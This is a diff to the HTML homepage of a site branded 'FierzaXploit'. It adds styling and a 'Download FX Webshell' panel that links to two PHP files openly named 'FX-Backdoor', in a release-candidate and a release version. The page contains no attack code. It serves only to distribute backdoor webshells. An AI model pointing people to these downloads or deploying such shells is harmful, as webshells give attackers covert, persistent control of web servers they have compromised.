@@ -18,16 +18,42 @@
             background-image: url('assets/img/29262.jpg');
             background-repeat: no-repeat;
         }
+        
+        .logo {
+            width: 150px;
+            height: 150px;
+        }
+        
+        .card-body {
+            width: 100%;
+        }
+        
+        @media (min-width: 992px) {
+            body {
+                overflow-x: hidden;
+                background-attachment: fixed;
+                background-color: grey;
+                background-blend-mode: multiply;
+                background-image: url('assets/img/29262.jpg');
+                background-repeat: no-repeat;
+            }
+            .logo {
+                width: 250px;
+                height: 250px;
+            }
+            .card-body {
+                width: 50%;
+            }
+        }
     </style>
     <title>Home</title>
 </head>
 
 <body>
     <!-- navbar -->
-    <br>
     <div class="container-fluid">
         <a class="btn" data-bs-toggle="offcanvas" href="#offcanvasExample" role="button" aria-controls="offcanvasExample">
-            <font color="white" size="5"><i class="bi bi-list"></i></font>
+            <font color="white" size="6"><i class="bi bi-list"></i></font>
         </a>
 
         <div class="offcanvas offcanvas-start" tabindex="-1" id="offcanvasExample" aria-labelledby="offcanvasExampleLabel">
@@ -53,8 +79,64 @@
         </div>
     </div>
     <!-- akhir navbar -->
+    <br>
+    <!-- content -->
+    <div class="container-fulid">
+        <center>
+            <img class="logo" src="https://i.ibb.co/Z615hHn/guy-fawkes-mask.png">
+            <h5 class="text-white">- FierzaXploit -<br> Simple,Responsive & Powerfull</h5>
 
+            <font size="5" color="white">Welcome,<span id="myElement"></span></font>
+            <br><br>
+            <a class="btn btn-danger" data-bs-toggle="collapse" href="#collapseExample" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="bi bi-download"></i> Download FX Webshell</a>
+            <div class="collapse" id="collapseExample">
+                <div class="card card-body">
+                    <div class="table-responsive">
+                        <table class="table table-hover caption-bottom">
+                            <thead>
+                                <tr>
+                                    <th scope="col">#</th>
+                                    <th scope="col">Name</th>
+                                    <th scope="col">Version</th>
+                                    <th scope="col">Action</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <th scope="row">1</th>
+                                    <td>FX-Shell</td>
+                                    <td>1.0(Release Candidate)</td>
+                                    <td><a href="https://raw.githubusercontent.com/FierzaEriez/FierzaEriez.github.io/main/FX-Backdoor(Release%20Candidate).php" class="text-dark text-decoration-none">Raw</a> || <a href="FX-Backdoor(Release Candidate).php"
+                                            class="text-dark text-decoration-none">Download</a></td>
+                                </tr>
+                                <tr>
+                                    <th scope="row">2</th>
+                                    <td>FX-Shell</td>
+                                    <td>1.1(Release)</td>
+                                    <td><a href="https://raw.githubusercontent.com/FierzaEriez/FierzaEriez.github.io/main/FX-Backdoor(Release).php" class="text-dark text-decoration-none">Raw</a> || <a href="FX-Backdoor(Release).php" class="text-dark text-decoration-none">Download</a></td>
+                                </tr>
+                            </tbody>
+                            <caption>*Terimakasih Telah Menggunakan FX-Webshell yang saya buat</caption>
+                        </table>
+                    </div>
+                </div>
+            </div>
+        </center>
+    </div>
+    <!-- akhir content -->
+    <br>
+    <!-- footer -->
+    <div class="container-fluid">
+        <p class="text-white text-center">Design & Developed By FierzaXploit<br>Copyright&copy;2021</p>
+    </div>
+    <!-- akhir footer -->
     <!-- Optional JavaScript; choose one of the two! -->
+    <script src="https://unpkg.com/typeit@8.0.7/dist/index.umd.js"></script>
+    <script>
+        new TypeIt("#myElement", {
+            strings: " user!",
+        }).go();
+    </script>
 
     <!-- Option 1: Bootstrap Bundle with Popper -->
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
